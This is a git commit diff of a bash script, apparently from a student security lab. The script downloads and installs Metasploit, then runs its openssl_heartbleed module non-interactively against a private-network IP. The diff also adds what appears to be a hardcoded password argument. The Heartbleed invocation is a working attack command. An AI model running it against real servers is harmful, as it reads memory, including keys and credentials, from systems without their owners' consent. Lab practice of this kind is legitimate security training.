5acdcad35ca3b9b72b8b4edf9d80c02ffd24161e
amineAUPEC <79785242+amineAUPEC@users.noreply.github.com>
2021-06-10 18:26:26 +0200

    182

--- bash/msf/metasploit.sh
+++ bash/msf/metasploit.sh
@@ -2,12 +2,12 @@
 
 curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
   chmod 755 msfinstall && \
-  ./msfinstall 
+  ./msfinstall -i -p "vitrygtr"
 
-
+ip="192.168.1.33"
 
 # lancer metasploit
-/opt/metasploit-framework/bin/msfconsole
+# /opt/metasploit-framework/bin/msfconsole
 
 ## répondre yes
 ## etudiant 
@@ -15,10 +15,10 @@ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/t
 
 
 ## setting payload
-use auxiliary/scanner/ssl/openssl_heartbleed
-set VERBOSE true
-set RHOSTS $ip
-exploit
+# use auxiliary/scanner/ssl/openssl_heartbleed
+# set VERBOSE true
+# set RHOSTS $ip
+# exploit
 
 
-
+/opt/metasploit-framework/bin/msfconsole -q -x " use auxiliary/scanner/ssl/openssl_heartbleed ; set VERBOSE true ; set RHOSTS $ip ; exploit"
